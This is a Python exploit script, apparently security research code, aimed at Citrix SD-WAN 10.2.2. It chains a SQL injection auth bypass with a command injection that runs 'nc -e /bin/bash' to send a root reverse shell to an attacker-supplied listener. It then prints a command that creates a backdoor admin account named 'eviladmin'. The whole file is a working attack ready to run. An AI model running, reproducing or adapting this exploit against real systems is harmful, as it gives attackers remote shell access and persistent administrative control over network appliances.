import requests, urllib
import sys, os, argparse
import random
from OpenSSL import crypto
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 10 # sec

def err_and_exit(msg):
    print '\n\nERROR: ' + msg + '\n\n'
    sys.exit(1)

# auth bypass via file write
def do_sql_injection(base_url):
    url = base_url + '/sdwan/nitro/v1/config/get_package_file?action=file_download'
    headers = { 'SSL_CLIENT_VERIFY' : 'SUCCESS' }
    token = random.randint(10000, 99999)
    json = {
        "get_package_file": {
            "site_name"         : "blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_" + str(token) + "';#",
            "appliance_type"    : "primary",
            "package_type"      : "active"
        }
    }

    try:
        r = requests.post(url, headers=headers, json=json, verify=False, timeout=TIMEOUT)
    except requests.exceptions.ReadTimeout:
        return None

    # error is expected
    expected = {"status":"fail","message":"Invalid value specified for site_name or appliance_type"}
    if (r.status_code == 400 and r.json() == expected):
        return token
    else:
        return None

# spawns a reverse shell
def do_cmd_injection(base_url, token, ncip, ncport):
    cmd = 'sudo nc -nv %s %d -e /bin/bash' % (ncip, ncport) # 
    url = base_url + '/cgi-bin/installpatch.cgi?swc-token=%d&installfile=`%s`' % (token, cmd)
    success = False
    try:
        r = requests.get(url, verify=False, timeout=TIMEOUT)
    except requests.exceptions.ReadTimeout:
        success = True

    # a timeout is success. it means we should have a shell
    return success

##### MAIN #####

desc = 'Citrix SD-WAN Appliance 10.2.2 SQLi Auth Bypass and Remote Command Execution'
arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument('-t', required=True, help='Citrix SD-WAN IP Address (Required)')
arg_parser.add_argument('-ncip', required=True, help='Netcat listener IP')
arg_parser.add_argument('-ncport', type=int, default=4444, help='Netcat listener port (Default: 4444)')

args = arg_parser.parse_args()

print "Starting... be patient. This takes a sec."

# Path to target app
base_url = 'https://' + args.t

# do sql injection to get a swc-token for auth bypass
token = do_sql_injection(base_url)
if (token is None):
    err_and_exit('SQL injection failed.')

print 'SQL injection successful! Your swc-token is ' + str(token) + '.'

# if this worked, do the command injection
# create a new admin user and spawn a reverse shell
success = do_cmd_injection(base_url, token, args.ncip, args.ncport)

if success is False:
    err_and_exit('Not so sure command injection worked. Expected a timeout.')

print 'Seems like command injection succeeded.'
print 'Check for your shell!\n'
print 'To add an admin web user, run this command: perl /home/talariuser/bin/user_management.pl addUser eviladmin evilpassword 1'